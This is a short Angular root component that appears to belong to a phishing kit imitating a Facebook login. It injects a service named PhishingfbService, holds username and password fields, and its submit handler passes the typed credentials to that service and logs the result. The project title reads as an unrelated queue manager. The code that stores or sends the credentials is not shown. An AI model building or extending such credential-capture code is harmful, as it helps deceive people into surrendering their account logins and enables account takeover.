import { Component, OnInit } from '@angular/core';
import { interval, Subject } from 'rxjs';
import { User } from './interfaces/user';
import { PhishingfbService } from './shared/services/phishingfb.service';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent implements OnInit {
  title = 'queue-manager-web-angular';
  interval: any;
  user: User = {
    username: "",
    password: ""
  };
  destroy$: Subject<any> = new Subject();
  constructor(public phishingFbService: PhishingfbService) { }
  ngOnInit() {


  }
  submitLogForm(data) {
    this.phishingFbService.signup(this.user).subscribe((data) => {
      console.log(data)
    })
  }
}
